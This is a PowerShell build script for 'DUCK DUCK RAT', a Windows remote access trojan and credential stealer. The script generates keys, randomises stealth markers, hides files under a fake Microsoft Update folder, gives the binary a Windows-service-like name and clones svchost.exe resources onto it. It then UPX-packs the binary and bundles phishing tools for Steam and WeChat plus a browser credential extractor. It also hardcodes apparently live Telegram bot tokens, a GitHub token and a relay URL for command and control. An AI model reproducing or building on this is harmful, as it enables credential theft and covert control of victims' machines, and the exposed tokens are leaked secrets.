# DUCK DUCK RAT v1: Ultra-Optimized Rebuild Script (V8.0)
$ErrorActionPreference = "Stop"

Write-Host "================================================" -ForegroundColor Cyan
Write-Host "          EMOCORE v1: CONSOLIDATED BUILD        " -ForegroundColor Cyan
Write-Host "================================================" -ForegroundColor Cyan

# Configuration
$SessionKey = New-Object Byte[] 32
$MasterKey = New-Object Byte[] 32
$rng = [System.Security.Cryptography.RNGCryptoServiceProvider]::Create()
$rng.GetBytes($SessionKey)
$rng.GetBytes($MasterKey)

$SessionKeyB64 = [System.Convert]::ToBase64String($SessionKey)
$MasterKeyB64 = [System.Convert]::ToBase64String($MasterKey)

# Wrap SessionKey with MasterKey (AES-CBC, Zero IV) for Constants.cs
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $MasterKey
$aes.IV = New-Object Byte[] 16
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::None
$encryptor = $aes.CreateEncryptor()
$encSessionKey = $encryptor.TransformFinalBlock($SessionKey, 0, $SessionKey.Length)
$EncryptedSessionKeyB64 = [System.Convert]::ToBase64String($encSessionKey)

Write-Host "[*] Patching Constants.cs with new synchronized keys..." -ForegroundColor Yellow
$constantsPath = "Core\Constants.cs"
$content = Get-Content $constantsPath -Raw
$content = $content -replace 'public const string MASTER_KEY_B64 = ".*?";', "public const string MASTER_KEY_B64 = `"$MasterKeyB64`";"
$content = $content -replace 'public const string ENCRYPTED_SESSION_KEY_B64 = ".*?";', "public const string ENCRYPTED_SESSION_KEY_B64 = `"$EncryptedSessionKeyB64`";"

# --- Phase 0.1: EmoCore v1 Finalization (Stealth & IPC) ---
Write-Host "[*] Phase 0.1: Randomizing IPC and Stealth Toggles..." -ForegroundColor Cyan

# 1. Disable Debug Mode for Production
$content = $content -replace 'DEBUG_MODE = true', 'DEBUG_MODE = false'

# 2. Randomize IPC markers
$RandIPC = "DuckDuckRat_Event_$( [Guid]::NewGuid().ToString("N").Substring(0, 8) )"
$content = $content -replace 'IPC_EVENT_BASE = ".*?"', "IPC_EVENT_BASE = `"$RandIPC`""

# 3. Randomize AppData subdirectory (Core)
$RandDir = "Microsoft\\Update\\$( [Guid]::NewGuid().ToString("N").Substring(0, 6) )"
$content = $content -replace 'APP_DATA_SUBDIR = ".*?"', "APP_DATA_SUBDIR = `"$RandDir`""

# 4. Randomize IO constants
$RandStealerDir = "$((Get-Random -Minimum 1000 -Maximum 9999))Svc"
$content = $content -replace 'STEALER_DIR_NAME = ".*?"', "STEALER_DIR_NAME = `"$RandStealerDir`""

# 5. [RED TEAM] Randomize Binary Name (Stealth Mutation)
$BinaryNames = @("WinSvcNet", "NetSvcUpdate", "WmiHostProc", "SysHostDiag", "WinUpdateTask", "SvcCacheLib")
$RandName = $BinaryNames[(Get-Random -Maximum $BinaryNames.Count)] + "_" + (Get-Random -Minimum 1000 -Maximum 9999) + ".exe"
Write-Host "[*] Random Binary Name Assigned: $RandName" -ForegroundColor Cyan

$RandCookie = "cache_$((Get-Random -Minimum 1000 -Maximum 9999)).db"
$content = $content -replace 'COOKIE_FILE_NAME = ".*?"', "COOKIE_FILE_NAME = `"$RandCookie`""

$RandPass = "log_$((Get-Random -Minimum 1000 -Maximum 9999)).tmp"
$content = $content -replace 'PASSWORD_FILE_NAME = ".*?"', "PASSWORD_FILE_NAME = `"$RandPass`""

$RandLog = "err_$((Get-Random -Minimum 1000 -Maximum 9999)).log"
$content = $content -replace 'LOG_FILE_NAME = ".*?"', "LOG_FILE_NAME = `"$RandLog`""

# 5. Randomize Version
$RandVer = "$((Get-Date).ToString("yyMM")).$((Get-Random -Minimum 1 -Maximum 9)).$((Get-Random -Minimum 0 -Maximum 99))-v1"
$content = $content -replace 'VERSION = ".*?"', "VERSION = `"$RandVer`""

Set-Content $constantsPath $content

Write-Host "[*] Phase 0.5: Nuclear Cleanup & Tool Preparation..." -ForegroundColor Yellow
$BadProcesses = @("svhost", "MicrosoftManagementSvc", "FinalBot", "EmoCore", "SteamLogin", "SteamAlert", "bore", "chromelevator")
foreach ($proc in $BadProcesses) {
    Get-Process $proc -ErrorAction SilentlyContinue | Stop-Process -Force
}
# Cleanup old artifacts to prevent 16-bit app errors (file locks)
$WorkDir = "$env:APPDATA\Microsoft\Windows\Network"
if (Test-Path $WorkDir) {
    Write-Host "[*] Purging resource cache in $WorkDir..." -ForegroundColor Gray
    Get-ChildItem $WorkDir -File | Remove-Item -Force -ErrorAction SilentlyContinue 
}

# --- Enhanced Nuclear Cleanup ---
Write-Host "[*] Phase 0.55: Purging workspace junk (Safe Cleanup)..." -ForegroundColor Yellow

# Delete hex-named symlinks/directories from ROOT only (ignoring .git)
$HexDirs = Get-ChildItem -Path . -Directory | Where-Object { $_.Name -match "^[0-9a-f]{2}$" }
foreach ($hDir in $HexDirs) {
    Remove-Item $hDir.FullName -Recurse -Force -ErrorAction SilentlyContinue 
}

# Delete all identifiable junk logs in the root
$JunkFiles = @(
    "build_error.log", "build_log.txt", "full_build.log", "copy.log", "copy2.log", "copy3.log",
    "error.log", "error_final.log", "error_restored.log", "error_restored2.log", "error_restored3.log",
    "error_restored4.log", "error_restored5.log", "error_restored6.log", "error_restored7.log", "error_restored8.log",
    "build.log", "build_utf8.log", "svc_debug.log", "svhost.bin"
)
foreach ($file in $JunkFiles) {
    if (Test-Path $file) { Remove-Item $file -Force -ErrorAction SilentlyContinue }
}

Remove-Item "dist", "scripts\publish", "tools\publish" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item "DiscordProSvc\bin", "DiscordProSvc\obj", "bin", "obj" -Recurse -Force -ErrorAction SilentlyContinue

if (!(Test-Path "dist")) { New-Item -ItemType Directory -Path "dist" | Out-Null }

# 1. Restore e_sqlite3.dll from NuGet cache if missing in root
if (!(Test-Path "e_sqlite3.dll")) {
    Write-Host "[*] Restoring e_sqlite3.dll from NuGet cache..." -ForegroundColor Yellow
    $NuGetPath = "C:\Users\zxc23\.nuget\packages\sqlitepclraw.lib.e_sqlite3\2.1.6\runtimes\win-x64\native\e_sqlite3.dll"
    if (Test-Path $NuGetPath) { Copy-Item $NuGetPath "." -Force }
}

Write-Host "[*] Phase 0.6: Building Resource Packer (Self-Contained Toolchain)..." -ForegroundColor Cyan
dotnet publish scripts\ResourcePacker.csproj -c Release -r win-x64 --self-contained true -o scripts\publish --nologo
if ($LASTEXITCODE -ne 0) { throw "ResourcePacker Compilation FAILED!" }
$PackerExe = Join-Path (Get-Location).Path "scripts\publish\ResourcePacker.exe"

Write-Host "[*] Phase 0.7: Secure String Hardening (Vault 2.0 via Toolchain)..." -ForegroundColor Yellow

# [!] ВНИМАНИЕ: Все секреты надежно зашифрованы в Vault
$Secrets = @{
    "BOT_TOKEN_1"        = "8497188042:AAFKAy0IJK3K6oFcNoR4CNO5fYPxqo7VcrQ"
    "BOT_TOKEN_2"        = "8771147119:AAFt-I1d5469nHZIs29BwkDfjTGeU0ZtLj4"
    "BOT_TOKEN_3"        = "8520181797:AAFXKy6odun3bzVlKF2f0m3Uiycl5-gO0xo"
    "ADMIN_ID"           = "-1003555531875"                         
    "GIST_PROXY_ID"      = "a704361ef0c6942a3fb89254d6e7fa54"
    "GIST_GITHUB_TOKEN"  = "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"
    "TG_API_BASE"        = "https://api.telegram.org/"
    "TG_FILE_BASE"       = "https://api.telegram.org/file/"
    "TG_API_FRONT"       = "https://vanguard-gateway.v-security.workers.dev/"
    "MS_TRIGGER"         = "computerdefaults.exe"
}

$VaultKey = New-Object Byte[] 32
$VaultIV = New-Object Byte[] 12
$rng.GetBytes($VaultKey)
$rng.GetBytes($VaultIV)

$VaultKeyB64 = [System.Convert]::ToBase64String($VaultKey)
$VaultIVB64 = [System.Convert]::ToBase64String($VaultIV)

# Prepare Secrets for the Packer
$PackerArgs = @("--vault", $VaultKeyB64, $VaultIVB64)
foreach ($name in $Secrets.Keys) {
    $plainB64 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($Secrets[$name]))
    $PackerArgs += $name
    $PackerArgs += $plainB64
}

# Run the Packer to generate Vault entries
$PackerOutput = & $PackerExe $PackerArgs
$VaultEntries = New-Object "System.Collections.Generic.List[string]"

foreach ($line in $PackerOutput) {
    if ($line -like "V_DATA:*") {
        $parts = $line.Split(":")
        $name = $parts[1]
        $cipher = $parts[2]
        $tag = $parts[3]
        $VaultEntries.Add("            { `"$name`", new VaultEntry { C = `"$cipher`", T = `"$tag`" } }")
    }
}

$VaultCode = [string]::Join(",`n", $VaultEntries)
# --- Phase 0.8: Pre-flight Safety Sanitization ---
$SafetyPath = "defense\SafetyManager.cs"
$SafetyContent = Get-Content $SafetyPath -Raw

Write-Host "[*] Sanitizing SafetyManager (Stripping HWID layer & restoring placeholders)..." -ForegroundColor Yellow
# 1. Force-strip HWID XOR layer from Resolve method
$SafetyContent = $SafetyContent -replace '// Derive Hardware-Bound Key Layer[\s\S]*?for \(int i = 0; i < 32; i\+\+\) hKey\[i\] \^= hwid\[i % hwid\.Length\];', "// Direct Key usage (Build-time synchronized)`n                if (VAULT_KEY == null) return `"KEY_ERR`";`n                byte[] hKey = VAULT_KEY;"

# 2. Restore placeholders if they were previously patched (idempotency)
$SafetyContent = $SafetyContent -replace 'private static byte\[\] VAULT_KEY = Convert\.FromBase64String\(.*?\);', "private static byte[]? VAULT_KEY;"
$SafetyContent = $SafetyContent -replace 'private static byte\[\] VAULT_IV = Convert\.FromBase64String\(.*?\);', "private static byte[]? VAULT_IV;"

# --- Phase 0.9: Vault Injection (Vault 2.0) ---
Write-Host "[*] Injecting build-time synchronized secrets..." -ForegroundColor Yellow

# Patch the VaultKey and VaultIV
$SafetyContent = $SafetyContent -replace 'private static byte\[\]\? VAULT_KEY;', "private static byte[] VAULT_KEY = Convert.FromBase64String(`"$VaultKeyB64`");"
$SafetyContent = $SafetyContent -replace 'private static byte\[\]\? VAULT_IV;', "private static byte[] VAULT_IV = Convert.FromBase64String(`"$VaultIVB64`");"

# Patch the Dictionary
$Pattern = 'private static readonly Dictionary<string, VaultEntry> _vault = new Dictionary<string, VaultEntry>\s*\{[\s\S]*?\};'
$NewDict = "private static readonly Dictionary<string, VaultEntry> _vault = new Dictionary<string, VaultEntry>`n        {`n$VaultCode`n        };"
$SafetyContent = [System.Text.RegularExpressions.Regex]::Replace($SafetyContent, $Pattern, $NewDict)

Set-Content $SafetyPath $SafetyContent

Write-Host "[*] Phase 1: Building Discord Pro Svc (NativeAOT)..." -ForegroundColor Cyan
dotnet publish DiscordProSvc\DiscordProSvc.csproj -c Release -r win-x64 -p:PublishAot=true --nologo
if ($LASTEXITCODE -ne 0) { throw "DiscordProSvc Build FAILED!" }

$SvcPath = "DiscordProSvc\bin\Release\net8.0-windows\win-x64\publish\DiscordProSvc.exe"
Copy-Item $SvcPath "dist\svhost.exe" -Force

Write-Host "[*] Phase 4: Compressing & Encrypting Resources..." -ForegroundColor Cyan
& $PackerExe "dist\svhost.exe" "svhost.bin" $SessionKeyB64

if (!(Test-Path "svhost.bin")) {
    throw "Critical Resource Error: svhost.bin was NOT created by the packer!"
}

# Pack other large resources if they exist
$OtherResources = @(
    @{ Src = "tools\SteamAlert.exe";   Dest = "SteamAlert.bin" },
    @{ Src = "tools\SteamLogin.exe";   Dest = "SteamLogin.bin" },
    @{ Src = "tools\WeChatPhish.exe";  Dest = "WeChatPhish.bin" },
    @{ Src = "tools\bore.exe";         Dest = "bore.bin" },
    @{ Src = "tools\chromelevator.exe";Dest = "chromelevator.bin" },
    @{ Src = "Modules\WeChat.exe";     Dest = "WeChatPhish.bin" }
)

foreach ($res in $OtherResources) {
    if (Test-Path $res.Src) {
        & $PackerExe $res.Src $res.Dest $SessionKeyB64
    }
}

Write-Host "[*] Phase 5: Final Monolithic AOT Build (DuckDuckRat)..." -ForegroundColor Cyan
dotnet publish DuckDuckRat.csproj -c Release -r win-x64 -p:PublishAot=true --nologo
if ($LASTEXITCODE -ne 0) { throw "Core Engine Build FAILED!" }

$BuildExe = "bin\Release\net8.0-windows\win-x64\publish\SvcHostLib.exe"
$FinalExe = "bin\Release\net8.0-windows\win-x64\publish\$RandName"

if (Test-Path $BuildExe) {
    Move-Item -Path $BuildExe -Destination $FinalExe -Force
}

Write-Host "[*] Phase 6: Resource Mimicry (svchost cloning)..." -ForegroundColor Cyan
dotnet publish tools\ResourceCloner.csproj -c Release -r win-x64 --self-contained true -o tools\publish --nologo
if ($LASTEXITCODE -eq 0) {
    $ClonerExe = "tools\publish\ResourceCloner.exe"
    & $ClonerExe "C:\Windows\System32\svchost.exe" $FinalExe
}
if (Get-Command upx.exe -ErrorAction SilentlyContinue) {
    Write-Host "[*] Phase 7: UPX Packing (Stealth Compression)..." -ForegroundColor Cyan
    & upx.exe --ultra-brute $FinalExe | Out-Null
}

Write-Host "`n[SUCCESS] Ultra-Optimized build complete!" -ForegroundColor Green
Write-Host "[+] Binary: $FinalExe" -ForegroundColor White
$Size = (Get-Item $FinalExe).Length / 1MB
Write-Host "[+] Final Size: $('{0:N2}' -f $Size) MB" -ForegroundColor Yellow

# Final Cleanup
Remove-Item dist, scripts\publish, Core\Constants.cs.bak, Persistence.cs, defense\persist.cs -Recurse -Force -ErrorAction SilentlyContinue
